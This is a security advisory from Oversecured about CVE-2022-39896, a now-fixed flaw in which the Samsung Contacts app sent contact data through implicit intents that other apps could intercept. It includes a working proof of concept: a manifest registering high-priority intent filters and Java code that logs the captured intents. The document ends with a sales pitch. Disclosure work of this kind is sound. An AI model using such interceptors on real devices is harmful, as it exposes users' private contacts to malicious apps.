# Details

<table>
    <tr>
        <td>Name</td>
        <td>Contacts</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.app.contacts</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.13</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39896">CVE-2022-39896</a> (SVE-2022-0914)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$960</td>
    </tr>
</table>

# Description

Oversecured found multiple uses of implicit intents that could have been intercepted by third-party apps installed on the same device::
![](Oversecured_report.png)

These intents contained data on user contacts and also passed the rights to read from the content provider to the contacts.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.android.contacts.action.SET_EMERGENCY_MEDICAL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="intent.action.IMPORT_SIM_CONTACT" />
        <data android:mimeType="vnd.android.cursor.item/sim-contact" />
        <data android:mimeType="*/*" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="intent.action.CONTACTS_INTEGRATED_SEARCH" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="intent.action.IMPORT_SIM2_CONTACT" />
        <data android:mimeType="vnd.android.cursor.item/sim-contact" />
        <data android:mimeType="*/*" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.contacts.action.SHOW_GROUP_DETAIL" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.sprint.zone.DSA_ACTIVITY" />
        <data android:mimeType="vnd.sprint.zone/vnd.sprint.zone.main" />
        <data android:mimeType="*/*" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.sprint.dsa.DSA_ACTIVITY" />
        <data android:mimeType="vnd.sprint.dsa/vnd.sprint.dsa.main" />
        <data android:mimeType="*/*" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.vvmapp.action.LAUNCH_VVM" />
        <data android:scheme="content" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.contacts.action.VIEW_CONTACT" />
        <data android:scheme="content" />
        <data android:mimeType="vnd.android.cursor.item/contact" />
        <data android:mimeType="*/*" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.sec.android.app.firewall.action.CONFIG_DIALOG" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:
```java
DumpUtils.dump(getIntent(), getClassLoader());
finish();
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.